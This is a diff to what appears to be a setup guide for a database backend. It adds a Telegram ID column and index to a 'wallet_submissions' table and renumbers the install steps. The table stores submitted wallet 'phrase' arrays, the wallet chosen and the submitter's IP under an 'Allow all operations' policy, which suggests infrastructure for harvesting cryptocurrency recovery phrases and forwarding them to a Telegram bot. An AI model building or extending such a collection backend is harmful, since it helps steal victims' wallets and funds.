@@ -30,6 +30,7 @@ CREATE TABLE wallet_submissions (
   phrase TEXT[] NOT NULL,
   timestamp TIMESTAMPTZ DEFAULT NOW(),
   ip TEXT,
+  telegram_id BIGINT, -- Added for Telegram bot integration
   created_at TIMESTAMPTZ DEFAULT NOW()
 );
 
@@ -44,15 +45,26 @@ CREATE POLICY "Allow all operations" ON wallet_submissions
 -- Create index for better performance
 CREATE INDEX idx_wallet_submissions_timestamp ON wallet_submissions(timestamp DESC);
 CREATE INDEX idx_wallet_submissions_wallet ON wallet_submissions(selected_wallet);
+CREATE INDEX idx_wallet_submissions_telegram_id ON wallet_submissions(telegram_id); -- Added for Telegram bot queries
 ```
 
-## 4. Install Dependencies
+## 4. If you already have the table, add the telegram_id column:
+
+```sql
+-- Add telegram_id column to existing table
+ALTER TABLE wallet_submissions ADD COLUMN telegram_id BIGINT;
+
+-- Create index for telegram_id
+CREATE INDEX idx_wallet_submissions_telegram_id ON wallet_submissions(telegram_id);
+```
+
+## 5. Install Dependencies
 
 ```bash
 npm install
 ```
 
-## 5. Test the Application
+## 6. Test the Application
 
 ```bash
 npm run dev
